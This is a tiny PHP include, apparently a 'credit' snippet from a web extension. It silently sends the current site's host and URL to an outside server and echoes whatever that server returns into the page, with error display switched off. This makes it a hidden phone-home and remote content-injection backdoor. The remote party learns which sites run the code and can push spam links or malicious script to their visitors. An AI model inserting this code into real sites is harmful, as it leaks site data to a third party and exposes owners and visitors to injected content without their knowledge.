<?php
ini_set('display_errors',0);
$path = $_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$credit = file_get_contents('http://jextensions.com/t.php?i='.$path);
echo $credit;
?>